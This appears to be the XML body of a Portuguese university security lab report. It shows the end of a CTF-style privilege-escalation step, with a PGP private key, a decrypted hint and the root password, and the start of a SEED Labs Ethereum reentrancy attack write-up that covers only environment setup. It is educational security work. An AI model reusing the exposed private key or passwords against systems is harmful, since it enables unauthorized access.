        <w:t>a2edIAQZAQoABgUCaQptLQAKCRAr8nAaofo+XggwBACLwKkmktnEnZOEDOEo1Dzo</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>RjHV3VpEFVmmDjk2JRgXP65WfqF4p8SbmLoLm/ymvwft+pPNtE23l+PIXbN0a/0n</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>J7S/B4Zcukgj55pX3gnMm+pQvf65Hrqri90xM6hL27ca1fPOBhw3c8vImzEiELfl</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>/PZRKurTWhkQFhOPQZc6o/R9A/9wA980d//58BUpoIQT/TYynLkxB/oNg80cKqbh</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>VFC6QAWW8LZLEt3fVXNRgk/jqbd7Cu8UTYLtPUBnhlgqZ4mJOD6uu0SV7/1v6vag</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>IAiAig9x5aObac1UstLdRnDpX0r7pYY8KTwpZyWRjExm+O75JAT+B04DKB9IP1vo</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>UFI1vA==</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>=0t5V</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>-----END PGP PRIVATE KEY BLOCK-----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A2E1D4F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00363733" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Mensagem:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06274CF3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FencedCode"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>-----BEGIN PGP MESSAGE-----</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Version: Keybase OpenPGP v2.1.15</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Comment: https://keybase.io/crypto</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>wYwDICWyzKLEe6wBBACO2e1e1zpYZXzglue+nkcVheT6AusegXFatiRN84ELqFna</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>XOBgCIAEbSyUgejhjg7hycm1HHduWzXzwj9X5Ua5CCEocREi/26j1FmrvRl2lyIG</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>DR6DINMosknWnWiw1GKNwlR8/KloGO5JueNOF0+tkHzCWq/43hTOmBruDn+LMNLA</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>RgGhA94QZJTkRDn+2ZoHg5NjQ/6Yq8M6pFp7/subFRBOxX4jKuaGDYApt8hmt0RD</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>+bN1qSes0EiE3h546VyUYSALjwNqUBBSnPhcE6HN7tJcdlH/ZyL7G/ifEEwgSv4v</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>73JsZkoQjsHs9f9Gs+van/G6EmMPPTOb5pbJUz/SNFhxXud8ZQUxif0YBAIU8kZM</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>g2W2l5I3ATqDhwHkN26ePsKvuoC8tQjanFPNh/zDfM403miYDWajf7RDr4IyvVky</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>iR/xCqnEBJ1f4UJ1uu5623dkU7ybDcAwHNOOwPcFoYTZ24HyHqHE9nRK1RfEdZIX</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>D3kPl1WFDCikRA1LuLkaUKOEMwf9lhw=</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>=7Ejw</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>-----END PGP MESSAGE-----</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CBFB350" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00363733" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Mensagem desencriptada:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="514EBDE8" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FencedCode"/>
      </w:pPr>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
        </w:rPr>
        <w:t xml:space="preserve">Hello I'm gROOT! </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">And my password is...nah! </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
        </w:rPr>
        <w:t>Assim tão fácil não, pega uma dica.</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>I'm hiding in plain sight. I'm actually dateORtime! I've been looking at you for the past hours, time to root this machine.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>I'm only 4 characters long, don't bruteforce me pls, don't be mean.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D84FD0" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00363733" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Navega até ao diretórios que descobriste no passo anterior e descriptografa o conteúdo através da private key.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="097AB2EF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00363733" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Vês que o conteúdo são algumas dicas, essas dicas servem para escalares finalmente para root. A password é o time que aparece como último login entras na máquina, sem os ":".</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="432F4288" w14:textId="5E4E8F07" w:rsidR="00224B0C" w:rsidRPr="00363733" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Password: </w:t>
      </w:r>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:rStyle w:val="InlineCode3"/>
          <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>0359</w:t>
      </w:r>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6706C0BC" w14:textId="1285AB94" w:rsidR="00224B0C" w:rsidRPr="00363733" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="75B8A0E8" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00363733" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AC1C799" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00363733" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D7ADBA9" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00363733" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2392DB45" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00363733" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E5ACB43" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00363733" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="291A5C42" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00363733" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E52542F" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00363733" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3343A039" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00363733" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28DE643A" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00363733" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04D8BA60" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00363733" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E835871" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00363733" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E59D21D" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00363733" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="10EBB9D3" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00363733" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F967993" w14:textId="62592FA5" w:rsidR="00224B0C" w:rsidRPr="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="134" w:name="_Toc213881932"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Blockchain Reentrancy Attack</w:t>
      </w:r>
      <w:r w:rsidRPr="00224B0C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Lab - Resolução</w:t>
      </w:r>
      <w:bookmarkEnd w:id="134"/>
    </w:p>
    <w:p w14:paraId="2FBE38D1" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07182EBB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00224B0C" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45C56ECF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00224B0C" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4238E1DA" w14:textId="6850F404" w:rsidR="00224B0C" w:rsidRDefault="00224B0C">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="65C9BFBC" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRPr="00363733" w:rsidRDefault="00224B0C" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="135" w:name="_Toc213881933"/>
      <w:r w:rsidRPr="00363733">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Sumário</w:t>
      </w:r>
      <w:bookmarkEnd w:id="135"/>
    </w:p>
    <w:p w14:paraId="07CD884F" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:spacing w:before="180" w:after="180"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Esta parte </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>apresenta a resolução completa do laboratório de Reentrancy Attack dos SEED Labs. O laboratório teve como objetivo explorar uma vulnerabilidade crítica em smart contracts Ethereum através da implementação prática de um ataque de reentrancy, análise do seu funcionamento, e posterior correção da vulnerabilidade.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F2FF96" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="136" w:name="_Toc213881934"/>
      <w:r>
        <w:t>1. Introdução</w:t>
      </w:r>
      <w:bookmarkEnd w:id="136"/>
    </w:p>
    <w:p w14:paraId="6F4402DE" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="137" w:name="_Toc213881935"/>
      <w:r>
        <w:t>Contexto</w:t>
      </w:r>
      <w:bookmarkEnd w:id="137"/>
    </w:p>
    <w:p w14:paraId="1F2EF5B6" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="138" w:name="_Toc213881936"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
        </w:rPr>
        <w:t>O ataque de reentrancy ficou mundialmente conhecido após o ataque à DAO em 2016, onde mais de 150 milhões de dólares foram roubados, levando ao hard fork que criou o Ethereum Classic. Esta vulnerabilidade continua relevante, sendo explorada regularmente no ecossistema Ethereum.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="138"/>
    </w:p>
    <w:p w14:paraId="679512B8" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:bookmarkStart w:id="139" w:name="_Toc213881937"/>
      <w:r>
        <w:t>2. Configuração do Ambiente</w:t>
      </w:r>
      <w:bookmarkEnd w:id="139"/>
    </w:p>
    <w:p w14:paraId="5CFC013F" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="140" w:name="_Toc213881938"/>
      <w:r>
        <w:t>2.1 Setup Inicial</w:t>
      </w:r>
      <w:bookmarkEnd w:id="140"/>
    </w:p>
    <w:p w14:paraId="4AC8B703"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Iniciamos extraindo os arquivos do laboratório e preparando o emulador:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1121C1DD"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6287E"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unzip</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Labsetup.zip</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w: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dcbuild</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dcup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5716F19B"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Aguardamos a inicialização completa do emulador. Durante este período, os nós Ethereum foram configurados usando o protocolo Proof-of-Authority (PoA).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="263FBB99" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="141" w:name="_Toc213881939"/>
      <w:r>
        <w:t>2.2 Verificação do Ambiente</w:t>
      </w:r>
      <w:bookmarkEnd w:id="141"/>
    </w:p>
    <w:p w14:paraId="760CB2D2"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Após a inicialização, acessamos o EtherView em </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>http://localhost:5000/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> para confirmar que a blockchain estava operacional.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6035251D"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Instalamos as dependências Python necessárias:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71DDA911"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pip3 install web3==5.31.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FABE1B7" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="142" w:name="_Toc213881940"/>
      <w:r>
        <w:t>2.3 Teste de Conexão</w:t>
      </w:r>
      <w:bookmarkEnd w:id="142"/>
    </w:p>
    <w:p w14:paraId="5FFF2316"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Realizamos um teste de conexão com o nó Ethereum (conforme indicado no ficheiro cripto.txt, o IP usado foi </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>10.151.0.71</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F1FBA0" w14:textId="77777777" w:rsidR="00224B0C" w:rsidRDefault="00224B0C" w:rsidP="00224B0C">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:between w:val="nil"/>
        </w:pBdr>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>import</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> SEEDWeb3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">web3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> SEEDWeb3.connect_to_geth_poa(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="4070A0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>'http://10.151.0.71:8545'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="Cambria" w:hAnsi="Cambria" w:cs="Cambria"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">(web3.isConnected())  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="60A0B0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t># Retorna True se conectado</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="334F13E6"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lastRenderedPageBreak/>
        <w:t>Desbloqueamos uma conta para realizar transações:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BBB322C"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 xml:space="preserve">sender_account </w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> web3.eth.accounts[</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="40A070"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w: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web3.geth.personal.unlockAccount(sender_account, </w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="4070A0"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"admin"</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5780B719"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Verificamos o saldo da conta selecionada:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FFD1052"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b/>
          <w:bCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:r w:rsidRPr="00371B58">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
